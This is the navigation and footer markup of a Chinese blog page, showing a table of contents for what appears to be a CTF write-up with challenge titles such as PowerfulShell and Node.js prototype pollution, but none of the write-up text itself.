href="#%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95-1"><span class="toc-number">3.2.</span> <span class="toc-text">官方解法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-number">3.2.1.</span> <span class="toc-text">第一种</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-number">3.2.2.</span> <span class="toc-text">第二种</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8C%AB%E5%92%AA"><span class="toc-number">4.</span> <span class="toc-text">猫咪</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9"><span class="toc-number">4.1.</span> <span class="toc-text">官方</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E7%9B%92%E5%AD%90"><span class="toc-number">5.</span> <span class="toc-text">打不开的盒子</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%8F%E6%97%A5%E8%AE%BA%E6%96%87%E5%A4%AA%E5%A4%9A%E4%BA%86"><span class="toc-number">6.</span> <span class="toc-text">每日论文太多了</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95-2"><span class="toc-number">6.1.</span> <span class="toc-text">官方解法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E7%8E%8B"><span class="toc-number">7.</span> <span class="toc-text">大小王</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%85%A7%E7%89%87"><span class="toc-number">8.</span> <span class="toc-text">照片</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AA%E4%BA%BA%E8%A7%A3%E6%B3%95-1"><span class="toc-number">8.1.</span> <span class="toc-text">个人解法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95-3"><span class="toc-number">8.2.</span> <span class="toc-text">官方解法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E5%AE%BD%E7%9A%84%E5%AE%BD%E5%AD%97%E7%AC%A6"><span class="toc-number">9.</span> <span class="toc-text">不宽的宽字符</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95-4"><span class="toc-number">9.1.</span> <span class="toc-text">官方解法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PowerfulShell"><span class="toc-number">10.</span> <span class="toc-text">PowerfulShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95-5"><span class="toc-number">10.1.</span> <span class="toc-text">官方解法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Node-js-is-Web-Scale"><span class="toc-number">11.</span> <span class="toc-text">Node.js is Web Scale</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">11.1.</span> <span class="toc-text">原型链污染</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PaoluGPT"><span class="toc-number">12.</span> <span class="toc-text">PaoluGPT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E5%A4%A7%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">13.</span> <span class="toc-text">强大的正则表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%BA%A7"><span class="toc-number">13.1.</span> <span class="toc-text">一级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E7%BA%A7"><span class="toc-number">13.2.</span> <span class="toc-text">二级</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%83%9C%E5%AD%97%E5%A6%82%E9%87%91-3-0"><span class="toc-number">14.</span> <span class="toc-text">惜字如金 3.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%98%E9%9B%85%E7%9A%84%E4%B8%8D%E7%AD%89%E5%BC%8F"><span class="toc-number">15.</span> <span class="toc-text">优雅的不等式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E8%8E%B7%E5%8F%96%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">16.</span> <span class="toc-text">无法获取的秘密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B6%89%E5%8F%8A%E7%82%B9"><span class="toc-number">16.1.</span> <span class="toc-text">涉及点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E5%83%8F%E7%BC%96%E7%A0%81"><span class="toc-number">16.1.1.</span> <span class="toc-text">图像编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E8%BE%93%E5%85%A5"><span class="toc-number">16.1.2.</span> <span class="toc-text">浏览器自动输入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E7%A0%81%E9%83%A8%E5%88%86"><span class="toc-number">16.1.3.</span> <span class="toc-text">解码部分</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker-for-Everyone-Plus"><span class="toc-number">17.</span> <span class="toc-text">Docker for Everyone Plus</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9C%8B%E4%B8%8D%E8%A7%81%E7%9A%84%E5%BD%BC%E6%96%B9%EF%BC%9A%E4%BA%A4%E6%8D%A2%E7%A9%BA%E9%97%B4"><span class="toc-number">18.</span> <span class="toc-text">看不见的彼方：交换空间</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ZFS-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D"><span class="toc-number">19.</span> <span class="toc-text">ZFS 文件恢复</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/21/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86/%E7%BD%91%E7%BB%9C%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%E5%8E%9F%E7%90%86/" title="Resilience4j Circuit Breaker">Resilience4j Circuit Breaker</a><time datetime="2025-09-21T12:27:19.000Z" title="更新于 2025-09-21 20:27:19">2025-09-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/21/%E7%AC%94%E8%AE%B0/%E6%97%A0%E5%A4%B4%E6%B5%8F%E8%A7%88%E5%99%A8/%E6%97%A0%E5%A4%B4%E6%B5%8F%E8%A7%88%E5%99%A8/" title="无头浏览器">无头浏览器</a><time datetime="2025-09-21T05:56:19.000Z" title="更新于 2025-09-21 13:56:19">2025-09-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/21/%E7%AC%94%E8%AE%B0/Resilience4jCircuitBreaker/Resilience4jCircuitBreaker/" title="Resilience4j Circuit Breaker">Resilience4j Circuit Breaker</a><time datetime="2025-09-21T05:27:19.000Z" title="更新于 2025-09-21 13:27:19">2025-09-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/21/%E7%AC%94%E8%AE%B0/ELK/ELK/" title="ELK">ELK</a><time datetime="2025-09-21T04:56:19.000Z" title="更新于 2025-09-21 12:56:19">2025-09-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/21/%E7%AC%94%E8%AE%B0/SpringBootAdmin/SpringBootAdmin/" title="SpringBootAdmin">SpringBootAdmin</a><time datetime="2025-09-21T04:56:19.000Z" title="更新于 2025-09-21 12:56:19">2025-09-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Boranget</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>